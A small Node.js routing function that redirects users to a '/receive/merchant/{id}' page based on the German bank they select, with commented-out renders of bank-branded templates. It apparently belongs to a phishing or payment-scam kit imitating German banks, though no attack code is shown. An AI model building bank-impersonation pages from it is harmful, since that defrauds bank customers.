module.exports = function send(res, id, bank) {
    switch (bank) {
        case "PostBank":
            res.redirect(`/receive/merchant/${id}`)
            break
        case "Sparkasse":
            /* res.render('pages/banksDE/sparkasse', {
                id: id
            }) */
            res.redirect(`/receive/merchant/${id}`)
            break
        case "Bank Comdirect":
            res.redirect(`/receive/merchant/${id}`)
            /* res.render('pages/banksDE/comdirect', {
                id: id
            }) */
            break
        case "DKB Bank":
            res.redirect(`/receive/merchant/${id}`)
            /* res.render('pages/banksDE/dkb', {
                id: id
            }) */
            break
        case "Commerzbank":
            res.redirect(`/receive/merchant/${id}`)
            /* res.render('pages/banksDE/commerz', {
                id: id
            }) */
            break
        case "DZbank":
            res.redirect(`/receive/merchant/${id}`)
            break
        case "Other card (VISA/MASTERCARD)":
            res.redirect(`/receive/merchant/${id}`)
            break
    }
}